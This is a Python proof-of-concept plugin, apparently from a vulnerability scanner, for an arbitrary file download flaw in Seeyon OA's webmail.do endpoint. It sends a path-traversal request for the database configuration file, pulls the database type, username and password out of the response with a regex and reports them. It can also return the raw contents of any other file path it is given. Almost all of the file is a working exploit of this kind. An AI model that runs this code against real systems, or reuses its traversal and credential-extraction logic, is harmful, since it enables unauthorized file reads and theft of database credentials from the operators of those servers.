# -*- coding:utf-8 -*-
# 致远OA_webmail.do任意文件下载
import re

from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def webmail_download(self, url, file="../conf/datasourceCtp.properties", type="poc"):
        resp = self.requestUtil.get(
            url + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=%s"%file)
        if type == "poc":
            if "ctpDataSource.url" in resp.text:
                info = \
                    re.findall(
                        "ctpDataSource.username=(.*?)workflow.dialect=(.*?)ctpDataSource.*?ctpDataSource.password=(.*?)ctpDataSource.url",
                        resp.text, re.DOTALL)[0]
                return info
            else:
                return False
        else:
            return resp.text



    def fingerprint(self):
        try:
            if self.service.url:
                return True
        except:
            return False


    def poc(self, service: ServiceScan):
        try:
            info = self.webmail_download(service.url)
            if info:
                return ["致远OA_webmail.do任意文件下载", "数据库: %s<br>用户名: %s<br>密码: %s" % (info[1], info[0], info[2])]
            else:
                return []
        except Exception as e:
            print(e)
            return []
